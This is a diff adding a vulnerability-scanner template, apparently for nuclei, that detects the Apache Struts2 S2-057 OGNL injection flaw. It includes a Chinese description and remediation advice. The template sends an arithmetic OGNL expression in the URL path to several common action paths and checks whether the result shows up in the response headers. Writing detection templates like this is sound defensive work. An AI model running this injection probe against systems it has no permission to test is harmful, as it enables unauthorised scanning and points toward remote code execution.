@@ -1,0 +1,44 @@
+id: S2-057
+info:
+  name: Apache Struts2 S2-057远程代码执行
+  author:
+  - 折跃
+  description: |-
+    Struts2 S2-057 远程命令执行
+    当Struts2的配置满足以下条件时：
+    alwaysSelectFullNamespace值为true
+    action元素未设置namespace属性，或使用了通配符
+    namespace将由用户从uri传入，并作为OGNL表达式计算，最终造成任意命令执行漏洞。
+    影响版本: 小于等于 Struts 2.3.34 与 Struts 2.5.16
+  severity: critical
+  remediation: |-
+    #### 官方修复方案：
+    升级系统至无漏洞版本，或于官网下载安全补丁。
+
+    #### 临时修复方案
+    在执行涉及到可以将字符串作为代码执行的函数时，需要严格验证用户传递的参数，同时尽量避免用户控制参数。
+requests:
+- matchers:
+  - type: dsl
+    condition: and
+    dsl:
+    - status_code==302
+    - contains(all_headers,to_string(to_number(verify)*to_number(3)))
+  raw:
+  - |
+    GET /$%7B({{verify}}*3)%7D{{tmpPath}} HTTP/1.1
+    Host: {{Hostname}}
+  attack: clusterbomb
+  payloads:
+    tmpPath:
+    - /
+    - /index.action
+    - /login.action
+    - /default.action
+    - /admin.action
+    - /user.action
+  redirects: true
+  req-condition: true
+  stop-at-first-match: true
+variables:
+  verify: '{{rand_int(10000,20000)}}'
